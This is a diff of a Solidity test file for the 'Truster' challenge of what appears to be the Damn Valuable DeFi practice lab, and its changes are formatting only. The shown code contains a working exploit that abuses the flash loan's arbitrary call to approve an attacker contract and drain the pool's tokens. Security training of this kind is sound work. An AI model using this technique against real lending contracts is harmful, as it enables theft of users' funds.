@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -52,11 +52,11 @@ contract TrusterChallenge is Test {
      */
     function test_truster() public checkSolvedByPlayer {
         Attacker attacker = new Attacker(token, pool);
-        
-        uint256 amountToApprove = 1_000_000 * 10**18;
+
+        uint256 amountToApprove = 1_000_000 * 10 ** 18;
         address attackerAddress = address(attacker);
         bytes memory data = abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), attackerAddress, amountToApprove);
-        
+
         pool.flashLoan(0, msg.sender, address(token), data);
         attacker.withdrawAndSend();
 
@@ -77,7 +77,7 @@ contract TrusterChallenge is Test {
     }
 }
 
-contract Attacker is Test{
+contract Attacker is Test {
     DamnValuableToken token;
     TrusterLenderPool pool;
     address recovery = makeAddr("recovery");
@@ -88,6 +88,6 @@ contract Attacker is Test{
     }
 
     function withdrawAndSend() public {
-        token.transferFrom(address(pool), recovery, 1_000_000 * 10**18);
+        token.transferFrom(address(pool), recovery, 1_000_000 * 10 ** 18);
     }
 }
